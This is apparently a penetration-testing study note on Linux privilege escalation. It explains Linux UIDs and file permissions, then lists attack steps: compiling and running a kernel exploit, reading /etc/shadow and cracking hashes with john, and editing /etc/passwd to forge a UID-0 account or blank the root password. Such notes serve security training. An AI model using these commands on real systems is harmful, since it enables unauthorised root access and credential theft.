## Linux Privilege Escalation

![68747470733a2f2f7062732e7477696d672e636f6d2f6d656469612f44415a73453256555141415f62705a2e6a7067](https://user-images.githubusercontent.com/87951795/131122135-fea9fb57-8ea1-4a2a-8969-347305dc1814.jpg)

Windows / Linux Local Privilege Escalation Workshop: https://github.com/sagishahar/lpeworkshop

Tools:
- https://github.com/diego-treitos/linux-smart-enumeration
- https://github.com/rebootuser/LinEnum

Other Tools:
- https://github.com/linted/linuxprivchecker
- https://github.com/AlessandroZ/BeRoot
- http://pentestmonkey.net/tools/audit/unix-privesc-check

Permissions in Linux

- User accounts are configured in the /etc/passwd file.
- User password hashes are stored in the /etc/shadow file.
- Groups are configured in the /etc/group file.
  - Users have a primary group (has the same name  as their user account), and can have multiple secondary (or supplementary) groups.
- Users are identified by an integer user ID (UID). (root (UID) = 0) (id & cat /proc/$$/status | grep "[UG]id")
  - Real: A user’s real ID is who they actually are (the ID defined in /etc/passwd).
  - Effective: A user’s effective ID is normally equal to their real ID, however when executing a process as another user, the effective ID is set to that user’s real ID
  - Saved: saved ID is used to ensure that SUID processes can temporarily switch a user’s effective ID back to their real ID and back again without losing track of the original effective ID.

Files & Directories  
![linux-file---folder-permissions](https://user-images.githubusercontent.com/87951795/131246543-ed68873f-40e0-49ba-b313-0e66c32baf52.gif)
- Files
  - Read – when set, the file contents can be read.
  - Write – when set, the file contents can be modified.
  - Execute – when set, the file can be executed (i.e. run as some kind of process).
- Directories
  - Execute – when set, the directory can be entered. Without this permission, neither the read nor write permissions will work.
  - Read – when set, the directory contents can be listed.
  - Write – when set, files and subdirectories can be created in the directory.
- Special Permissions
  - SUID: When set, files will get executed with the privileges of the file owner.
  - SGID: When set on a file, the file will get executed with the privileges of the file group. When set on a directory, files created within that directory will inherit the group of the directory itself.
  - -r-sr-sr-x The first s stands for the SUID and the second one stands for SGID.

## The kernel exploit:
Should be a last resort as kernel exploits can often be unstable and may be one shot or cause a system crash.
1. Enumerate kernel version (uname -a).
2. Find matching exploits use Linux Exploit Suggester 2 or (Google, ExploitDB, GitHub).  
  - https://github.com/jondonas/linux-exploit-suggester-2
```
./linux-exploit-suggester.pl -k (karnel vertion from uname -a)

or

searchsploit linux kernel 2.6.32 priv esc
searchsploit linux kernel 2.6 debian priv esc
```
3. Compile and run.
```
gcc -pthread c0w.c -o c0w
./c0w
/usr/bin/passwd
```
## Weak File Permissions
- Readable /etc/shadow:
  - cat /etc/shadow (copy password hash found between the first and second colons : to file)
  - john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
- Writable /etc/shadow:
  - mkpasswd -m sha-512 newpasswordhere
  - Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.
- Writable /etc/passwd 
  - if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow.
    - root:x:0:0:root:/root:/bin/bash
    - The “x” instructs Linux to look for the password hash in the /etc/shadow file
    - openssl passwd "password"
    - root:L9yLGxncbOROc:0:0:root:/root:/bin/bash
  - Alternatively, if we can only append to the file, we can create a new user but assign them the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different
    - newroot:L9yLGxncbOROc:0:0:root:/root:/bin/bash
  - In some versions of Linux, it is possible to simply delete the “x”, which Linux interprets as the user having no password
    - root::0:0:root:/root:/bin/bash



